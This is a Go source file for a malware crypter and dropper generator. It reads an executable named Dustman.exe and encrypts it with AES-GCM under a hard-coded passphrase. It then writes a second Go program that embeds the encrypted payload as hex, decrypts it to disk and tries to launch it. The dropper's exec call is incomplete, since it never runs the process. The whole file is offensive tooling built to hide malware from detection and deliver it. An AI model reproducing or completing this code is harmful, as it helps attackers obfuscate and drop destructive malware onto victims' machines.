package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"os"
)
//https://www.thepolyglotdeveloper.com/2018/02/encrypt-decrypt-data-golang-application-crypto-packages/
func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func encrypt(data []byte, passphrase string) []byte {
	// creates a password hash
	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
	// Galois Counter Mode Encryption, superior to AES Cipher Block Chaining
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	// Returns ciphertext as bytes
	//fmt.Printf("%x", ciphertext)
	return ciphertext

}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func encryptFile(filename string, data []byte, passphrase string) {
	// Need to change this, to allow reading of files and encrypting it
	// This merely creates a file that is encrypted with a string
	f, _ := os.Create(filename)
	defer f.Close()
	f.Write(encrypt(data, passphrase))
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func decryptMalware(encryptedMalware []byte, passphrase string) []byte {
	return decrypt(encryptedMalware, passphrase)
}

func encryptMalware(origMalware []byte, passphrase string) []byte {
	encryptedMalware := encrypt(origMalware, passphrase)
	//hexEncryptedMalware := fmt.Sprintf("%x",encryptedMalware)
	return encryptedMalware
}
//func readMalware(filename string) []byte {
//	var dat []byte
//	dat, err := ioutil.ReadFile(filename)
//	if err != nil {
//		fmt.Println("Error in readMalware(): %s",err)
//	}
//	return dat, err
//}
func writePayload(hexEncryptedMalware []byte) {
	//var templateGoFile []byte
	templateGoFile := fmt.Sprintf(`
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"io/ioutil"
	"fmt"
	"os/exec"
)

func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func main() {
	dat := "%x"
	decodedDat, err := hex.DecodeString(dat)
	if err != nil {
		fmt.Printf("#{err}")
	}
	decryptedDat := decrypt([]byte(decodedDat), "password1")
	ioutil.WriteFile("./DecryptedDustman.exe", decryptedDat, 0777)
	exec.Command("DecryptedDustman.exe")
}`, hexEncryptedMalware)
	ioutil.WriteFile("./DustmanCrypter.go", []byte(templateGoFile), 0777)
}
func main() {
	fmt.Println("Starting the application...")
	//ciphertext := encrypt([]byte("Hello World"), "password")
	//fmt.Printf("Encrypted: %x\n",ciphertext)
	//plaintext := decrypt(ciphertext, "password")
	//fmt.Printf("Decrypted: %s\n", plaintext)
	// Add a reader IO as bytes function here
	//dat, err := readMalware("Dustman.exe")
	dat, err := ioutil.ReadFile("Dustman.exe")
	//b64dat := base64.StdEncoding.EncodeToString(dat)
	if err != nil {
		fmt.Println(err)
	}
	// EncryptFile function (outputFile, data read from malware, passphrase)
	encryptFile("EncryptedDustman.exe", dat, "password1")
	decryptedDat := decryptFile("EncryptedDustman.exe", "password1")
	//fmt.Printf(decryptedDat)
	// Decrypted malware has same matching hash
	ioutil.WriteFile("./DecryptedDustman.exe", decryptedDat, 0777)
	// Attempt to create a hex encoded payload in another go file, where that other go file serves as a dropper
	hexEncryptedMalware := encryptMalware(dat, "password1")
	// proven it works
	//fmt.Printf("%x",hexEncryptedMalware)
	writePayload(hexEncryptedMalware)
}